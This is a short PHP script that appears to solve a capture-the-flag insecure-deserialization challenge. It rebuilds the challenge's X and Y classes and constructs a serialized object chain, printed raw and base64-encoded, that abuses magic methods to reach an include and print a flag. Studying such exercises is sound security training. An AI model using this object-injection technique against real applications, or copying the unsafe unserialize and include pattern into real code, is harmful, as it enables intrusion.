<?php
$printflag = false;

class X {
    function __construct($cleanup) {
        if ($cleanup === "flag") {
            die("NO!\n");
        }
        $this->cleanup = $cleanup;
    }

    function __toString() {
        return $this->cleanup;
    }

    function __destruct() {
        global $printflag;
        if ($this->cleanup !== "flag" && $this->cleanup !== "noflag") {
            die("No!\n");
        }
        include $this->cleanup . ".php";
        if ($printflag) {
            echo $FLAG . "\n";
        }
    }
}

class Y {
    function __wakeup() {
        echo $this->secret . "\n";
    }

    function __toString() {
        global $printflag;
        $printflag = true;
        return (new X($this->secret))->cleanup;
    }
}
$obj_YY = new Y;
$obj_YY->secret = 'taidh';

$obj_Y = new Y;
$obj_Y->secret = $obj_YY;

$obj_X = new X('taidh');
$obj_X->cleanup = 'flag';

$str = serialize([$obj_Y, $obj_X]);
echo $str . PHP_EOL;
echo base64_encode($str) . PHP_EOL;
unserialize($str);
?>